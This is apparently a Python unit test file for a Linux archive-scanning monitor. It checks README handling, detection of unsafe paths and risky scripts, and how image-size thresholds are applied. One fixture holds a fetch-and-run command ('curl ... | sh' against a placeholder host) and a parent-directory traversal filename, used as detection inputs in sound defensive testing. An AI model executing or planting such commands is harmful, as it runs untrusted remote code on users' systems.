import tempfile
import unittest
import zipfile
from pathlib import Path

from linux_defender.monitor import _archive_content_review, _scan_file


THRESHOLDS = {
    "large_file_bytes": 100 * 1024 * 1024,
    "max_uncompressed_bytes": 500 * 1024 * 1024,
    "max_ratio": 100,
    "max_entries": 10000,
    "ratio_min_bytes": 10 * 1024 * 1024,
}


class ArchiveReviewTests(unittest.TestCase):
    def make_archive(self, files):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        path = Path(temporary.name) / "sample.zip"
        with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for name, content in files.items():
                archive.writestr(name, content)
        return path

    def test_reads_readme_but_marks_creator_claim_unverified(self):
        path = self.make_archive({"README.md": "Creator: Example Corp\n"})
        with zipfile.ZipFile(path) as archive:
            findings = _archive_content_review(archive, THRESHOLDS)
        self.assertTrue(any("README present" in item for item in findings))
        self.assertTrue(any("Creator: Example Corp (unverified)" in item for item in findings))

    def test_reports_unsafe_paths_and_script_pattern(self):
        path = self.make_archive({"../escape.txt": "x", "install.sh": "curl https://example.invalid/x | sh\n"})
        with zipfile.ZipFile(path) as archive:
            findings = _archive_content_review(archive, THRESHOLDS)
        self.assertTrue(any("parent-directory" in item for item in findings))
        self.assertTrue(any("high-risk command patterns" in item for item in findings))

    def test_images_are_not_warned_for_large_file_threshold(self):
        with tempfile.TemporaryDirectory() as temporary:
            image = Path(temporary) / "photo.jpg"
            image.write_bytes(b"not really an image")
            findings = _scan_file(image, THRESHOLDS["large_file_bytes"], THRESHOLDS)
        self.assertEqual(findings, [])


if __name__ == "__main__":
    unittest.main()
